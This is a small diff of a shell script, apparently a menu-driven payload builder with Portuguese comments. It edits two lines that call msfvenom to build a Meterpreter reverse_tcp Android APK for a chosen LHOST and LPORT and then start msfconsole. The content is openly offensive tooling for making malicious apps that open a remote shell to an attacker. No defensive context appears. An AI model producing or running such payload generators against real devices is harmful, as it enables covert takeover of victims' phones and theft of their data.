@@ -49,8 +49,8 @@ figlet CREATE
 #
 #
 #Criando payload
-./msfvenom -p $dispo/meterpreter/reverse_tcp LHOST=$host LPORT=$porta R > /sdcard/$nome.apk
-./msfconsole
+msfvenom -p $dispo/meterpreter/reverse_tcp LHOST=$host LPORT=$porta R > /sdcard/$nome.apk
+msfconsole
 fi
 if [ "$opcao" = "2" ];then
 echo
